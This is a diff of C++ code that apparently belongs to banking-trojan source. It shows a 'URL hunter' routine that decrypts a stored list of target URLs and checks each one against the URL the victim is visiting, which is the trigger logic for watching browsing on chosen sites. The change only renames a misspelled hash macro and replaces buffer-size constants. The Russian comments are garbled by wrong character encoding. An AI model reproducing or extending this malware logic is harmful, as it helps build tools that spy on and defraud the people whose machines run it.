@@ -71,9 +71,9 @@ DWORD WINAPI HuntThred( LPVOID lpData )
 // ѕосле последней ссылки должно сто€ть два нулевых символа
 // URL1\0URL2\0URL3\0\0
 
-char HunterLinks[MAX_HUNTER_LINKS_SIZE] = "__URL__HUNTER__LINKS\0";
+char HunterLinks[HUNTER_PARAM_SIZE] = HUNTER_PARAM_NAME;
 
-#define HINTER_LINKS_HASH 0x9152F40C /* __BNK__HUNTER__LINKS */
+#define HUNTER_LINKS_HASH 0x9152F40C /* __BNK__HUNTER__LINKS */
 
 
 // ѕризнак успешного срабатывани€ охотника за ссылками
@@ -105,17 +105,17 @@ void URLHunter::CheckURL(PCHAR URL)
 {
 	// ѕроверить совпадение ссылки с любой ссылкой из списка ссылок охотника
 	if (HunterCompleted || STR::IsEmpty(URL) ||
-		CalcHash(HunterLinks) == HINTER_LINKS_HASH)
+		CalcHash(HunterLinks) == HUNTER_LINKS_HASH)
 		return;
 
 	// ѕеребираем все ссылки в поисках нужной нам
 	PCHAR Tmp = HunterLinks;
 
-	PCHAR DecryptedURL = STR::Alloc(MAX_HUNTER_LINKS_SIZE);
+	PCHAR DecryptedURL = STR::Alloc(HUNTER_PARAM_SIZE);
 
 	while (*Tmp != NULL)
 	{
-		m_memset(DecryptedURL, 0, MAX_HUNTER_LINKS_SIZE);
+		m_memset(DecryptedURL, 0, HUNTER_PARAM_SIZE);
 		Decrypt(Tmp, DecryptedURL);
 
 		if (CompareUrl(DecryptedURL, URL))
